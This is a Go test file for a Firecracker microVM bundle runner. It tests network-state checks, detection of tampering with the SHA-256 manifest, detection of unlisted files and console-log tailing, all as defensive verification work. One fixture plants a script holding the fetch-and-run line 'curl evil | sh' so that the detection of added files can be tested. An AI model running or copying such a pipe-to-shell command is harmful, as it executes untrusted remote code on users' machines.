// cmd/run/main_test.go
package main

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeFile(t *testing.T, root, rel, body string) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestCheckNetsetupState_MissingFileNamesTheFix(t *testing.T) {
	err := checkNetsetupState(t.TempDir(), 2)
	if err == nil {
		t.Fatal("expected refusal when netsetup.state is absent")
	}
	for _, want := range []string{"netsetup.state", "sudo ./netsetup up 2"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error must name %q, got: %v", want, err)
		}
	}
}

func TestCheckNetsetupState_RefusesWhenCountTooLow(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "netsetup.state", "count=1\nruleset_sha=deadbeef\n")
	err := checkNetsetupState(root, 2)
	if err == nil {
		t.Fatal("expected refusal: 1 guarded TAP, 2 instances requested")
	}
	if !strings.Contains(err.Error(), "sudo ./netsetup up 2") {
		t.Errorf("error must name the fix, got: %v", err)
	}
}

func TestCheckNetsetupState_AcceptsSufficientCount(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "netsetup.state", "count=4\nruleset_sha=deadbeef\n")
	if err := checkNetsetupState(root, 2); err != nil {
		t.Fatalf("4 guarded TAPs must satisfy 2 instances, got: %v", err)
	}
}

func TestCheckNetsetupState_RefusesUnparseableState(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "netsetup.state", "ruleset_sha=deadbeef\n")
	err := checkNetsetupState(root, 1)
	if err == nil {
		t.Fatal("expected refusal when there is no count= line")
	}
	// Pin the MESSAGE, not merely the refusal. Mutation-testing this file showed the
	// no-count-line branch can be deleted outright and the test still passes, because
	// the shortfall branch below it also refuses — with a message naming the wrong
	// problem ("netsetup covers -1 instance(s)"). A gate that refuses for a reason it
	// cannot state correctly is exactly the failure this project is meant not to ship.
	if !strings.Contains(err.Error(), "no count= line") {
		t.Errorf("error must name the missing count= line, got: %v", err)
	}
}

// TestCheckNetsetupState_NegativeCountNamesItself: netsetup can only write a
// canonical 0..256 count, so a negative one means the file was hand-written or
// corrupted. Reporting that as "no count= line" sends the operator looking for a
// line that is right there in the file.
func TestCheckNetsetupState_NegativeCountNamesItself(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "netsetup.state", "count=-5\nruleset_sha=deadbeef\n")
	err := checkNetsetupState(root, 1)
	if err == nil {
		t.Fatal("expected refusal on a negative count")
	}
	if !strings.Contains(err.Error(), "-5") {
		t.Errorf("error must quote the bad value, got: %v", err)
	}
	if strings.Contains(err.Error(), "no count= line") {
		t.Errorf("a present-but-negative count must not be reported as a missing line, got: %v", err)
	}
	// Pin the wording. Without its own branch a negative count falls through to the
	// shortfall message — "netsetup covers -5 instance(s) but config.yaml asks for 1" —
	// which quotes the value and avoids the words above while blaming netsetup for a
	// file netsetup could not have written. Mutation-tested: deleting the branch leaves
	// the two assertions above green.
	if !strings.Contains(err.Error(), "not a valid instance count") {
		t.Errorf("error must say the value itself is invalid, not blame netsetup's coverage, got: %v", err)
	}
}

// manifestBundle writes two files plus a matching MANIFEST.sha256.
func manifestBundle(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	files := map[string]string{"kernel/vmlinux": "KERNEL", "rootfs/rootfs.ext4": "ROOTFS"}
	var lines []string
	for rel, body := range files {
		writeFile(t, root, rel, body)
		sum := sha256.Sum256([]byte(body))
		lines = append(lines, hex.EncodeToString(sum[:])+"  ./"+rel)
	}
	writeFile(t, root, "MANIFEST.sha256", strings.Join(lines, "\n")+"\n")
	return root
}

func TestVerifyManifest_CleanBundlePasses(t *testing.T) {
	if err := verifyManifest(manifestBundle(t)); err != nil {
		t.Fatalf("unexpected: %v", err)
	}
}

func TestVerifyManifest_AbsentManifestIsAWarningNotAnError(t *testing.T) {
	if err := verifyManifest(t.TempDir()); err != nil {
		t.Fatalf("a dev tree with no manifest must warn, not fail: %v", err)
	}
}

func TestVerifyManifest_DetectsTamperedFile(t *testing.T) {
	root := manifestBundle(t)
	writeFile(t, root, "rootfs/rootfs.ext4", "ROOTFS-WITH-AN-EGRESS-PATH")
	err := verifyManifest(root)
	if err == nil {
		t.Fatal("expected failure on a modified file")
	}
	for _, want := range []string{"TAMPERED", "rootfs/rootfs.ext4"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error must name %q, got: %v", want, err)
		}
	}
}

// TestVerifyManifest_EmptyManifestIsFatal: truncating MANIFEST.sha256 to zero bytes
// is the cheapest possible tamper — no digest has to be forged, and the loop simply
// has nothing to check. "bundle verified: 0 file(s)" followed by a clean boot is the
// gate reporting success for having done nothing.
func TestVerifyManifest_EmptyManifestIsFatal(t *testing.T) {
	root := manifestBundle(t)
	writeFile(t, root, "MANIFEST.sha256", "")
	err := verifyManifest(root)
	if err == nil {
		t.Fatal("expected failure on an empty manifest — 0 files checked is not a pass")
	}
	if !strings.Contains(err.Error(), "MANIFEST.sha256") {
		t.Errorf("error must name the manifest, got: %v", err)
	}
}

func TestVerifyManifest_UnparseableLineIsFatal(t *testing.T) {
	root := manifestBundle(t)
	writeFile(t, root, "MANIFEST.sha256", "this is not a sha256sum line at all\n")
	err := verifyManifest(root)
	if err == nil {
		t.Fatal("expected failure on a manifest line that is not sha256sum output")
	}
	if !strings.Contains(err.Error(), "unparseable") {
		t.Errorf("error must say the line is unparseable, got: %v", err)
	}
}

func TestVerifyManifest_DetectsListedButMissingFile(t *testing.T) {
	root := manifestBundle(t)
	if err := os.Remove(filepath.Join(root, "kernel/vmlinux")); err != nil {
		t.Fatal(err)
	}
	err := verifyManifest(root)
	if err == nil {
		t.Fatal("expected failure when a listed file is gone")
	}
	if !strings.Contains(err.Error(), "kernel/vmlinux") {
		t.Errorf("error must name the missing file, got: %v", err)
	}
}

// --- present-but-unlisted files ------------------------------------------------
//
// bundle.sh builds MANIFEST.sha256 from `find . -type f` over the whole stick, so the
// manifest is a COMPLETE census: anything on the bundle it does not list was added
// after the build. That is worth naming, but it is deliberately NOT fatal — see the
// comment on reportUnlisted for why (netsetup.state alone would fail every real run).

func manifestListing(t *testing.T) map[string]bool {
	t.Helper()
	return map[string]bool{"kernel/vmlinux": true, "rootfs/rootfs.ext4": true}
}

func TestUnlistedFiles_CleanBundleReportsNothing(t *testing.T) {
	root := manifestBundle(t)
	extra, err := unlistedFiles(root, manifestListing(t))
	if err != nil {
		t.Fatal(err)
	}
	if len(extra) != 0 {
		t.Errorf("clean bundle must report no additions, got: %v", extra)
	}
}

func TestUnlistedFiles_ReportsAddedFiles(t *testing.T) {
	root := manifestBundle(t)
	writeFile(t, root, "totally-legit.sh", "#!/bin/sh\ncurl evil | sh\n")
	writeFile(t, root, "models/second.gguf", "SMUGGLED")
	extra, err := unlistedFiles(root, manifestListing(t))
	if err != nil {
		t.Fatal(err)
	}
	got := strings.Join(extra, ",")
	for _, want := range []string{"models/second.gguf", "totally-legit.sh"} {
		if !strings.Contains(got, want) {
			t.Errorf("must report %q as unlisted, got: %v", want, extra)
		}
	}
	// Sorted, so two runs of the same bundle print the same thing.
	if got != "models/second.gguf,totally-legit.sh" {
		t.Errorf("results must be sorted, got: %v", extra)
	}
}

// The manifest cannot list itself (bundle.sh excludes it), netsetup.state is written at
// the bundle root by `sudo ./netsetup up` on the machine that runs the stick, and
// config.yaml is excluded from the manifest on purpose — it is the file the README tells
// the operator to edit. Every correct run has all three. Reporting any of them as an
// unexpected addition would make this check cry wolf on every single boot.
func TestUnlistedFiles_IgnoresTheManifestRuntimeStateAndUserConfig(t *testing.T) {
	root := manifestBundle(t)
	writeFile(t, root, "netsetup.state", "count=1\nruleset_sha=deadbeef\n")
	writeFile(t, root, "config.yaml", "instances: 2\nram_mib: 3072\nvcpus: 4\nmodel: m.gguf\n")
	extra, err := unlistedFiles(root, manifestListing(t))
	if err != nil {
		t.Fatal(err)
	}
	if len(extra) != 0 {
		t.Errorf("MANIFEST.sha256, netsetup.state and config.yaml are expected, got: %v", extra)
	}
}

// --- console tail --------------------------------------------------------------
//
// The run dir is wiped on exit by contract, console logs included. On the failure
// path the tail goes to stderr first, or `up` destroys the one artefact its own
// error message tells the operator to read.

func TestTailFile_ReturnsTheLastLines(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "console.log", "one\ntwo\nthree\nfour\n")
	lines, err := tailFile(filepath.Join(root, "console.log"), 2)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(lines, "|") != "three|four" {
		t.Errorf("want the last 2 lines, got: %v", lines)
	}
}

func TestTailFile_ShortFileReturnsAllOfIt(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "console.log", "only line\n")
	lines, err := tailFile(filepath.Join(root, "console.log"), 40)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(lines, "|") != "only line" {
		t.Errorf("want the whole file, got: %v", lines)
	}
}

// An empty console log is its own diagnosis — firecracker produced no output at all —
// so it must come back as "no lines", never as one phantom blank line.
func TestTailFile_EmptyFileReturnsNoLines(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "console.log", "")
	lines, err := tailFile(filepath.Join(root, "console.log"), 40)
	if err != nil {
		t.Fatal(err)
	}
	if len(lines) != 0 {
		t.Errorf("empty file must yield no lines, got %d: %v", len(lines), lines)
	}
}

func TestTailFile_MissingFileIsAnError(t *testing.T) {
	if _, err := tailFile(filepath.Join(t.TempDir(), "nope.log"), 40); err == nil {
		t.Fatal("expected an error for a console log that does not exist")
	}
}

// A guest that spews to ttyS0 can make the console log arbitrarily large; the tail
// reads a bounded window off the end rather than the whole file, and must not emit
// the partial line that window starts in the middle of.
// maxLines is deliberately larger than the number of lines the byte window can hold,
// so every line the window contains is returned. With a smaller maxLines the tail
// slice would discard the truncated first line as a side effect and the test could not
// see the bug at all (mutation-tested: it stayed green).
func TestTailFile_BoundedWindowDropsThePartialFirstLine(t *testing.T) {
	root := t.TempDir()
	wide := strings.Repeat("n", 4096) // ~16 lines per 64 KiB window
	var b strings.Builder
	for i := 0; i < 200; i++ {
		b.WriteString(wide + "\n")
	}
	b.WriteString("LAST LINE\n")
	writeFile(t, root, "console.log", b.String())
	lines, err := tailFile(filepath.Join(root, "console.log"), 500)
	if err != nil {
		t.Fatal(err)
	}
	if len(lines) < 2 {
		t.Fatalf("want the whole tail window, got %d line(s)", len(lines))
	}
	if lines[len(lines)-1] != "LAST LINE" {
		t.Errorf("last line must be the newest, got: %q", lines[len(lines)-1])
	}
	for i, l := range lines[:len(lines)-1] {
		if l != wide {
			t.Errorf("line %d is a fragment the byte window cut in half (%d bytes, want %d)", i, len(l), len(wide))
		}
	}
}
